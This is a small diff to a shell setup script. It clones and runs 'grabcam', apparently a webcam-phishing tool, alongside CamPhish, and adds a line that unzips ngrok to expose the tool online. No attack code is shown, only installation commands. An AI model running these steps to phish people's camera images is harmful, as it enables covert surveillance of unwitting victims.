@@ -7,6 +7,7 @@ pip install lolcat
 bash Vretlee.sh
 git clone https://github.com/noob-hackers/grabcam
 ls
+unzip ngrok.zip
 cp ngrok $HOME/CamPhish/grabcam
 cd grabcam
 bash grabcam.sh
